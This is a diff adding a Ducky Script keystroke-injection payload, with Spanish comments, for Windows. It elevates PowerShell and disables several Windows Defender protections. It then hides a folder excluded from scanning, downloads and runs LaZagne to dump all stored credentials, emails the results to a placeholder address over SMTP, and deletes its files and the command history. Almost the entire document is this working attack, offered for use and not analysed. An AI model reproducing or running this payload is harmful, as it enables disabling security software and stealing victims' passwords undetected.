@@ -1,0 +1,79 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING Start-Process PowerShell -Verb RunAs
+ENTER
+DELAY 5000
+LEFT_ARROW
+DELAY 200
+ENTER
+DELAY 3000
+
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableBehaviorMonitoring $true
+ENTER
+DELAY 500
+DELAY 500
+STRING Set-MpPreference -DisableIntrusionPreventionSystem $true
+ENTER
+DELAY 500
+STRING Set-MpPreference -DisableScriptScanning $true
+ENTER
+DELAY 500
+
+REM Crear directorio temporal en Descargas
+STRING $dir = "C:\Users\$env:UserName\Downloads\tmp"
+ENTER
+STRING New-Item -ItemType Directory -Path $dir
+ENTER
+
+REM Añadir una exclusión para Windows Defender
+STRING Add-MpPreference -ExclusionPath $dir
+ENTER
+
+REM Ocultar el directorio
+STRING $hide = Get-Item $dir -Force
+ENTER
+STRING $hide.Attributes = 'Hidden'
+ENTER
+
+REM Descargar ejecutable
+STRING Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.2/lazagne.exe" -OutFile "$dir\lazagne.exe"
+ENTER
+
+REM Ejecutar LaZagne y guardar la salida
+STRING & "$dir\lazagne.exe" all > "$dir\output.txt"
+ENTER
+
+REM Configurar variables de correo
+STRING $smtp = "smtp.mail.com"
+ENTER
+STRING $From = "xxxx@mail.com"
+ENTER
+STRING $To = "xxxxx@mail.com"
+ENTER
+STRING $Subject = "Zero-Lazagne Report"
+ENTER
+STRING $Body = "Hi, here is the Report"
+ENTER
+STRING $Password = ConvertTo-SecureString "xxxxxxxxxxxxxx" -AsPlainText -Force
+ENTER
+STRING $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
+ENTER
+
+REM Enviar el correo con los datos extraídos
+STRING Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\output.txt" -SmtpServer $smtp -Port 587 -UseSsl -Credential $Credential
+ENTER
+
+REM Limpiar los rastros
+STRING Remove-Item -Path $dir -Recurse -Force
+ENTER
+STRING Clear-History
+ENTER
+STRING exit
+ENTER
